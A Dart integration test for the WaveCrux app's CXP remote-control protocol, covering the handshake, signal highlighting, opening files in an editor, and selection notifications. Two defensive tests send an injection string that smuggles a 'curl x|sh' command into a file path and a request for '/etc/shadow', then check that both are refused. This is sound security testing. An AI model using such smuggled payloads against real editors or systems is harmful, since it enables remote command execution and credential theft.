// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

import 'dart:io';

import 'package:crux_cxp/crux_cxp.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:wavecrux/domain/enums/scope_type.dart';
import 'package:wavecrux/domain/enums/var_direction.dart';
import 'package:wavecrux/domain/enums/var_type.dart';
import 'package:wavecrux/domain/models/app_settings.dart';
import 'package:wavecrux/domain/models/scope.dart';
import 'package:wavecrux/domain/models/variable.dart';
import 'package:wavecrux/features/remote/providers/cxp_server_provider.dart';
import 'package:wavecrux/features/settings/providers/settings_providers.dart';
import 'package:wavecrux/features/viewer/providers/signal_group_providers.dart';
import 'package:wavecrux/features/viewer/providers/waveform_source_provider.dart';
import 'package:wavecrux/services/remote/cxp/cxp_inbound_handlers.dart';
import 'package:wavecrux/services/remote/cxp/cxp_workspace_link.dart';
import 'package:wavecrux/services/remote/cxp/wavecrux_cxp_server.dart';
import 'package:wavecrux/services/remote/remote_control_notifier.dart';
import 'package:wavecrux/services/settings/settings_service.dart';

import '../../../helpers/fake_waveform_data_source.dart';
import '../../../helpers/platform_absolute_path.dart';
import '../../../helpers/product_telemetry_config.dart';
import '../../../helpers/wait_for.dart';
import 'cxp_round_trip_barrier.dart';

/// End-to-end integration test for CXP. Walks the full
/// pipeline: handshake → Subscribe → inbound RequestHighlight changes
/// WaveCrux state → ack → inbound RequestOpenSource invokes the editor
/// runner → ack → outbound NotifySelection appears on subscribed peers.
///
/// Uses the real Riverpod providers (cxpServerProvider, etc.) with
/// targeted overrides for the editor-command runner, manifest
/// directory, and AppSettings/SettingsService backing so the test does
/// not touch the real filesystem outside of a per-test temp dir or
/// spawn an external editor process.
void main() {
  late Directory tempDir;
  late ProviderContainer container;
  late LocalCxpClient client;
  late List<(String, String)> editorRunnerCalls;

  Scope buildScope() => const Scope(
    name: 'top',
    path: 'top',
    type: ScopeType.module,
    variables: [
      Variable(
        name: 'clk',
        varType: VarType.wire,
        direction: VarDirection.input,
        signalRef: 'top.clk',
        scopePath: 'top',
        bitWidth: 1,
      ),
    ],
  );

  setUpAll(() {
    TestWidgetsFlutterBinding.ensureInitialized();
    PackageInfo.setMockInitialValues(
      appName: 'WaveCrux',
      packageName: 'com.ferriteengineering.wavecrux',
      version: '0.0.0-test',
      buildNumber: '0',
      buildSignature: '',
    );
  });

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    tempDir = await Directory.systemTemp.createTemp('wavecrux_cxp_int_');
    editorRunnerCalls = [];

    container = ProviderContainer(
      overrides: [
        productTelemetryConfig,
        // Pin the manifest directory under our temp dir so the discovery
        // service does not write to the real app support dir.
        cxpManifestDirectoryProvider.overrideWith((_) async => tempDir.path),
        // CXP §11's containment rule over a fixed root. The production
        // callback reads the open tabs and the recent-files list; this
        // container has neither, so it would report nothing open and refuse
        // every path a peer sends. The rule object is the real one — only
        // where its roots come from is fixed here.
        cxpPathContainmentProvider.overrideWithValue(
          CxpPathContainment(roots: () => <String>[platformAbsolute('/rtl')]),
        ),
        // Pre-load AppSettings synchronously with a configured editor
        // command so the request_open_source handler reaches the runner.
        settingsServiceProvider.overrideWithValue(
          const _FakeSettingsService(
            AppSettings(cxpEditorCommand: 'fake-editor -g'),
          ),
        ),
        // Pre-populate the waveform source with our test fixture so the
        // RequestHighlight signal lookup succeeds.
        waveformSourceProvider.overrideWith(
          () => _PreloadedSourceNotifier(
            FakeWaveformDataSource(scopes: [buildScope()]),
          ),
        ),
        // Capture editor runner invocations without launching a process.
        cxpEditorCommandRunnerProvider.overrideWithValue(
          (command, target) async {
            editorRunnerCalls.add((command, target));
            return CxpHandlerResult.honoredOk;
          },
        ),
      ],
    );

    // Resolve the AppSettings future so the inbound open-source handler
    // sees a non-null value when it reads `.value`.
    await container.read(appSettingsProvider.future);

    // Start the CXP server on an OS-assigned port.
    final notifier = container.read(cxpServerProvider.notifier);
    final error = await notifier.startServer(0);
    expect(error, isNull, reason: 'CXP server start should succeed');
    final port = container.read(cxpServerProvider).port;

    // Connect a test client peer and complete the Hello handshake.
    client = LocalCxpClient(
      selfIdentity: const PeerIdentity(
        peerId: 'integration-test-client',
        productName: 'integration-test',
        productVersion: '0.0.0',
      ),
    );
    await client.connect(
      host: '127.0.0.1',
      port: port,
      token: cxpProcessAuthToken,
    );
    expect(client.isConnected, isTrue);
  });

  tearDown(() async {
    await client.dispose();
    await container.read(cxpServerProvider.notifier).stopServer();
    container.dispose();
    if (tempDir.existsSync()) {
      tempDir.deleteSync(recursive: true);
    }
  });

  test('handshake completes — remote peer identifies as wavecrux', () async {
    expect(client.remotePeer?.productName, 'wavecrux');
  });

  test(
    'CxpServerNotifier surfaces connector dial failures into '
    'cxpDialFailuresProvider',
    () async {
      // Reserve then release a port: a manifest pointing at it is a peer we
      // will discover but never be able to dial — the exact one-way-
      // connectivity case the indicator exposes.
      final probe = await ServerSocket.bind('127.0.0.1', 0);
      final deadPort = probe.port;
      await probe.close();

      final writer = CxpManifestWriter(manifestDirectory: tempDir.path);
      await writer.write(
        identity: const PeerIdentity(
          peerId: 'deadcrux-1-2',
          productName: 'deadcrux',
          productVersion: '0.1.0',
        ),
        host: '127.0.0.1',
        port: deadPort,
      );

      await waitFor(
        () => container
            .read(cxpDialFailuresProvider)
            .any((f) => f.peerId == 'deadcrux-1-2'),
        timeout: const Duration(seconds: 15),
        reason:
            'the notifier should push the connector dial failure into '
            'cxpDialFailuresProvider so the panel can render it',
      );
      final failure = container
          .read(cxpDialFailuresProvider)
          .firstWhere((f) => f.peerId == 'deadcrux-1-2');
      expect(failure.port, deadPort);
    },
  );

  test(
    'inbound RequestHighlight changes selectedSignalProvider + acks',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      client.send(
        const RequestHighlight(
          element: ElementId(kind: ElementKind.signal, path: 'top.clk'),
        ),
      );
      final ackEvent = await inbound
          .firstWhere((e) => e.message is RequestHighlightAck)
          .timeout(const Duration(seconds: 2));
      final ack = ackEvent.message as RequestHighlightAck;
      expect(ack.honored, isTrue);
      // Wait for the post-ack Riverpod state update to settle.
      await waitFor(
        () => container.read(selectedSignalProvider) == 'top.clk',
      );
      expect(container.read(selectedSignalProvider), 'top.clk');
      final entries = container.read(signalGroupsProvider).entries;
      expect(entries.map((e) => e.signalRef), contains('top.clk'));
    },
  );

  test('inbound RequestOpenSource invokes the editor runner + acks', () async {
    final inbound = client.inbound.asBroadcastStream();
    final cpuV = platformAbsolute('/rtl/cpu.v');
    client.send(
      RequestOpenSource(
        filePath: cpuV,
        line: 42,
        column: 7,
      ),
    );
    final ackEvent = await inbound
        .firstWhere((e) => e.message is RequestOpenSourceAck)
        .timeout(const Duration(seconds: 2));
    final ack = ackEvent.message as RequestOpenSourceAck;
    expect(ack.honored, isTrue);
    expect(editorRunnerCalls, [
      ('fake-editor -g', '$cpuV:42:7'),
    ]);
  });

  // The socket-level proof of the containment: this string is authored by
  // whoever connected, and to vim an argv element beginning with `+` is an
  // ex command rather than a filename. The refusal has to happen before the
  // runner is reached, and the peer has to be told why.
  test(
    'inbound RequestOpenSource refuses a file_path that is not a path',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      client.send(
        const RequestOpenSource(filePath: '+:!curl x|sh', line: 42),
      );
      final ackEvent = await inbound
          .firstWhere((e) => e.message is RequestOpenSourceAck)
          .timeout(const Duration(seconds: 2));
      final ack = ackEvent.message as RequestOpenSourceAck;
      expect(ack.honored, isFalse);
      expect(ack.reason, contains('absolute path'));
      expect(editorRunnerCalls, isEmpty, reason: 'no editor may be launched');
    },
  );

  // CXP §11's SHOULD, proven over a real socket: `/etc/shadow` is a perfectly
  // absolute path, and every check the four products carried before wire 1.2
  // would have let it through to the editor argv. `LocalCxpServer` screens
  // the wire with the floor (its one rule also screens a
  // `request_open_artifact` hint, which must not be rooted), so the refusal
  // comes from `dispatchCxpOpenSource`'s rooted check, before the runner is
  // reached, and rides back as the ack's reason without repeating the path
  // (CXP §9.11).
  //
  // MUTATION: deleting the `refuse` check in `dispatchCxpOpenSource` turns
  // this red.
  test(
    'inbound RequestOpenSource refuses a path outside the open directories',
    () async {
      final inbound = client.inbound.asBroadcastStream();
      final shadow = platformAbsolute('/etc/shadow');
      client.send(RequestOpenSource(filePath: shadow, line: 1));
      final ackEvent = await inbound
          .firstWhere((e) => e.message is RequestOpenSourceAck)
          .timeout(const Duration(seconds: 2));
      final ack = ackEvent.message as RequestOpenSourceAck;
      expect(ack.honored, isFalse);
      expect(ack.reason, contains('outside the directories'));
      expect(ack.reason, isNot(contains(shadow)));
      expect(editorRunnerCalls, isEmpty, reason: 'no editor may be launched');
    },
  );

  test('outbound NotifySelection reaches a subscribed peer when the local '
      'selection changes', () async {
    final inbound = client.inbound.asBroadcastStream();
    // Subscribe to notify_selection on the client side.
    client.send(
      const Subscribe(
        subscriptions: [
          CxpSubscription(messageKind: CxpMessageKind.notifySelection),
        ],
      ),
    );
    await cxpRoundTripBarrier(client);

    // Read the selection-emitter provider so it begins listening, then
    // change the selection — the emitter's signal-selection broadcast
    // should land on the client.
    container.read(cxpSelectionEmitterProvider);
    container.read(selectedSignalProvider.notifier).select('top.clk');
    final event = await inbound
        .firstWhere((e) => e.message is NotifySelection)
        .timeout(const Duration(seconds: 2));
    final ns = event.message as NotifySelection;
    expect(ns.elements.single.kind, ElementKind.signal);
    expect(ns.elements.single.path, 'top.clk');
  });

  test('event log records both inbound and outbound traffic', () async {
    final inbound = client.inbound.asBroadcastStream();
    // Subscribe so the broadcast actually fires.
    client.send(
      const Subscribe(
        subscriptions: [
          CxpSubscription(messageKind: CxpMessageKind.notifySelection),
        ],
      ),
    );
    await cxpRoundTripBarrier(client);
    container.read(cxpSelectionEmitterProvider);
    container.read(selectedSignalProvider.notifier).select('top.clk');
    // Wait for the outbound notify_selection to flush.
    await inbound
        .firstWhere((e) => e.message is NotifySelection)
        .timeout(const Duration(seconds: 2));

    // Also send an inbound request to confirm both directions get logged.
    client.send(
      const RequestHighlight(
        element: ElementId(kind: ElementKind.signal, path: 'top.clk'),
      ),
    );
    await inbound
        .firstWhere((e) => e.message is RequestHighlightAck)
        .timeout(const Duration(seconds: 2));

    // Wait for the event-log notifier to record both entries.
    await waitFor(
      () =>
          container
              .read(cxpEventLogProvider)
              .any(
                (e) => e.messageKind == CxpMessageKind.notifySelection,
              ) &&
          container
              .read(cxpEventLogProvider)
              .any(
                (e) => e.messageKind == CxpMessageKind.requestHighlight,
              ),
    );
    final entries = container.read(cxpEventLogProvider);
    expect(
      entries.any((e) => e.messageKind == CxpMessageKind.notifySelection),
      isTrue,
      reason: 'outbound notify_selection should be in the event log',
    );
    expect(
      entries.any((e) => e.messageKind == CxpMessageKind.requestHighlight),
      isTrue,
      reason: 'inbound request_highlight should be in the event log',
    );
  });
}

// ── Helpers ─────────────────────────────────────────────────────────────────

class _FakeSettingsService implements WaveCruxSettingsService {
  const _FakeSettingsService(this._settings);
  final AppSettings _settings;
  @override
  Future<AppSettings> load() async => _settings;
  @override
  Future<void> save(AppSettings settings) async {}
}

class _PreloadedSourceNotifier extends WaveformSourceNotifier {
  _PreloadedSourceNotifier(this._source);
  final FakeWaveformDataSource _source;
  @override
  AsyncValue<FakeWaveformDataSource> build() => AsyncData(_source);
}
